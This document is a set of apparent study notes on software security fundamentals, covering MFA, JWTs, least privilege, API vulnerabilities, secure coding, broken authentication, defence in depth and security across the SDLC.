Multi-Factor Authentication (MFA) is a security mechanism that requires users to provide two or more independent verification factors before gaining access to a system, rather than relying on a single password alone.

The three authentication factor categories:
1. Something you know — password, PIN, security question answer
2. Something you have — mobile phone (OTP), hardware token (YubiKey), smart card
3. Something you are — fingerprint, facial recognition, iris scan (biometrics)

MFA requires at least two factors from different categories. A password + OTP combination is the most common form (knowledge + possession).

How MFA strengthens security:
1. Compromised passwords alone are insufficient — even if an attacker obtains a user's password through phishing or data breach, they cannot log in without the second factor
2. Defence in depth — multiple independent barriers mean an attacker must compromise multiple systems simultaneously
3. Reduced impact of credential theft — credential-stuffing attacks (using breached passwords against other sites) are neutralised
4. Regulatory compliance — PCI-DSS, HIPAA, and banking regulations often mandate MFA for sensitive operations

Real-world example: Banking apps require: (1) password/PIN, (2) OTP sent to registered mobile, and sometimes (3) biometric verification for large transactions. Each layer independently protects the account.

A JSON Web Token (JWT) is a compact, self-contained token used to securely transmit information between parties as a digitally signed JSON object. JWTs are the dominant mechanism for stateless API authentication in modern web and mobile applications.

JWT structure: Three Base64URL-encoded parts separated by dots: Header.Payload.Signature
• Header — specifies the token type (JWT) and signing algorithm (e.g., HS256, RS256)
• Payload — contains claims: user ID, roles, token expiry (exp), issuer (iss)
• Signature — HMAC or RSA signature computed from Header + Payload + secret key; prevents tampering

How JWT-based authentication works:
1. User logs in with credentials
2. Server verifies credentials and issues a signed JWT
3. Client stores the JWT (typically in memory or a secure cookie)
4. Client includes the JWT in subsequent API requests: Authorization: Bearer <token>
5. Server verifies the signature on each request — no session state needed

Security best practices for JWT:
• Use short expiry times (e.g., 15 minutes) with refresh token rotation
• Always verify the signature server-side — never trust the payload without verification
• Use HTTPS to prevent token interception
• Never store sensitive data in the payload — it is base64-encoded, not encrypted
• Implement token revocation (blacklist or refresh token rotation) to handle logout securely

JWTs enable stateless, horizontally scalable APIs — the server does not need to query a session store for every request.

The Principle of Least Privilege (PoLP) states that every component, user, and process in a system should be granted only the minimum permissions necessary to perform its intended function — nothing more.

Why it matters: When any component is compromised (through a vulnerability, misconfiguration, or insider threat), the blast radius of the attack is limited to only what that component was permitted to do. An attacker who compromises a read-only service cannot modify or delete data if that service holds no write privileges.

Examples of least privilege in practice:

Database access: The application's database account should only have SELECT, INSERT, and UPDATE permissions on the tables it requires. It should not have DROP, CREATE, or admin rights. If a SQL injection attack occurs, the attacker cannot drop tables or create new admin users.

API endpoints: A read-only analytics service should be issued an API key or JWT with only read scopes. It should not be able to create or delete resources even if its token is stolen.

Operating system accounts: Application processes should not run as root or system administrator. A compromised web server running as a restricted user cannot install malware system-wide.

Role-Based Access Control (RBAC): A customer-facing portal employee has access only to customer data relevant to their role. Payroll data, audit logs, and admin functions are restricted to specific roles.

Summary: Least privilege is a foundational security design principle — it does not prevent attacks, but it significantly limits the damage any successful attack can cause.

APIs (Application Programming Interfaces) are increasingly the target of security attacks as they expose backend functionality to clients, mobile apps, and third parties. Common API vulnerabilities include:

1. Broken Object Level Authorisation (BOLA): The API does not verify that the requesting user has rights to the specific object. Example: GET /api/orders/1234 returns another user's order if the ID is guessed. Prevention: always verify the authenticated user owns the requested resource.

2. Missing authentication: Endpoints that should require a valid token are publicly accessible. Prevention: enforce JWT or OAuth token verification on every protected endpoint.

3. Excessive data exposure: The API returns more data than the client needs. Prevention: filter responses server-side — never rely on the client to hide sensitive fields.

4. Lack of rate limiting: No restriction on request volume enables brute-force attacks, credential stuffing, and denial of service. Prevention: implement rate limiting per IP and per authenticated user (e.g., 100 requests/minute).

5. Injection attacks: Malicious input passed through API parameters causes SQL injection or command injection. Prevention: validate and sanitise all input; use parameterised queries.

General API security best practices:
• Use HTTPS for all API communication — never expose APIs over plain HTTP
• Use JWTs with short expiry and proper signature verification
• Log and monitor all API calls for anomalous patterns
• Apply OWASP API Security Top 10 guidance during design and review
• Use API gateways (AWS API Gateway, Kong) to centralise authentication, rate limiting, and logging

Secure coding practices are a set of development guidelines that, when followed consistently, reduce the number and severity of security vulnerabilities in software. Security should be built in from the first line of code — not patched on after deployment.

1. Input Validation: Never trust data from external sources — users, APIs, files, environment variables. Validate data type, length, format, range, and character set on the server side. Reject or sanitise invalid input rather than attempting to "clean" dangerous input after the fact.

2. Use Encryption: Protect sensitive data at rest using strong encryption (AES-256) and protect data in transit using TLS (HTTPS). Encryption renders intercepted data useless to attackers without the key. Never transmit passwords, tokens, or PII over unencrypted channels.

3. Avoid Hardcoded Credentials: API keys, database passwords, and secret tokens must never be embedded in source code. These credentials end up in version control systems where they are permanently exposed. Use environment variables, configuration files excluded from version control, or dedicated secrets management tools (HashiCorp Vault, AWS Secrets Manager).

4. Least Privilege: Every component, user account, and service should operate with only the minimum permissions necessary. Restrict database accounts, file system access, and API scopes.

5. Error Handling and Logging: Never expose stack traces, database schema details, or internal paths to end users — this information helps attackers. Log security-relevant events (failed logins, access denials) for monitoring, but never log passwords or session tokens.

6. Dependency Management: Keep libraries and frameworks up to date. Use tools like OWASP Dependency-Check or Snyk to identify components with known vulnerabilities.

Broken Authentication refers to weaknesses in the implementation of authentication and session management that allow attackers to compromise passwords, session tokens, or other credentials to assume other users' identities.

Why it is critical: Authentication is the gateway to a system. If it is compromised, an attacker has full access to everything the victim account can do — and in administrative accounts, this means full system compromise.

Common causes of broken authentication:
1. Weak passwords accepted — allowing "password123" provides no real protection
2. No brute-force protection — allowing unlimited login attempts enables automated credential stuffing
3. Plain-text or weakly hashed password storage — a database breach immediately exposes all credentials
4. Session tokens not invalidated on logout — tokens remain valid after the user logs out, enabling session replay attacks
5. Insecure "remember me" implementations — long-lived session tokens stored insecurely
6. Missing MFA — relying solely on passwords that can be stolen via phishing or data breaches

1. Enforce strong password policies and check against known breached password lists (e.g., HaveIBeenPwned API)
2. Implement account lockout or exponential backoff after repeated failed login attempts
3. Use bcrypt or Argon2 for password hashing with per-user salts
4. Invalidate session tokens on logout and after a configurable idle period
5. Implement MFA — especially for privileged accounts
6. Use well-tested authentication libraries and frameworks rather than building from scratch

Defence in depth is a security strategy that employs multiple independent security controls across different layers of a system so that if one layer fails, others continue to protect the application. It is based on the principle that no single control is perfect.

Real-world example — Online Banking Application:

Layer 1 — Network perimeter: Web Application Firewall (WAF) blocks known attack patterns (SQLi, XSS, DDoS) before requests reach the application server.

Layer 2 — Transport encryption: All communication is encrypted with HTTPS/TLS, preventing man-in-the-middle interception of credentials and tokens.

Layer 3 — Authentication: Users authenticate with username + password followed by an OTP sent to their registered mobile (MFA). This ensures that stolen passwords alone are insufficient.

Layer 4 — Authorisation: Role-based access control restricts what each authenticated user can do. A customer cannot access other customers' accounts; a bank teller cannot authorise loans above a threshold.

Layer 5 — Application security: All SQL queries use prepared statements (preventing injection); all output is encoded (preventing XSS); session tokens expire after 15 minutes of inactivity.

Layer 6 — Data protection: Passwords are hashed with bcrypt; sensitive financial data is encrypted at rest with AES-256.

Layer 7 — Monitoring and response: Continuous anomaly detection flags unusual transaction patterns in real time. Incident response procedures automatically lock accounts when suspicious activity is detected.

Conclusion: An attacker who bypasses the WAF still faces HTTPS encryption, MFA, RBAC, parameterised queries, and monitoring — making a successful end-to-end breach extremely difficult.

Software security is not a phase at the end of the SDLC — it is a cross-cutting concern that must be integrated into every phase of the lifecycle. The cost of fixing a security defect increases dramatically the later it is discovered: a design-phase fix costs 10× less than a post-deployment fix.

Security across the SDLC:

Requirements phase: Identify security and privacy requirements alongside functional requirements. Define threat models — who might attack the system and how? Specify compliance requirements (GDPR, PCI-DSS, HIPAA).

Design phase: Apply security-by-design principles: least privilege, defence in depth, secure defaults, fail safely. Conduct threat modelling (STRIDE) to identify potential attack vectors before a line of code is written.

Implementation phase: Follow secure coding standards. Use SAST (Static Application Security Testing) tools to scan code for vulnerabilities as developers write it. Enforce code review with a security checklist.

Testing phase: Conduct DAST (Dynamic Application Security Testing) against a running application. Perform penetration testing to simulate real attacks. Include security test cases in unit and integration test suites.

Deployment phase: Harden server configurations; remove default credentials; apply security patches. Use infrastructure-as-code scanning to detect misconfigurations before deployment.

Maintenance phase: Monitor for new vulnerabilities in dependencies (CVE feeds, Snyk, OWASP Dependency-Check). Conduct periodic security audits and re-penetration tests.

DevSecOps: Modern organisations integrate security into CI/CD pipelines — "shift left" by catching vulnerabilities during development rather than after release. Every code push triggers automated security scanning alongside functional tests.
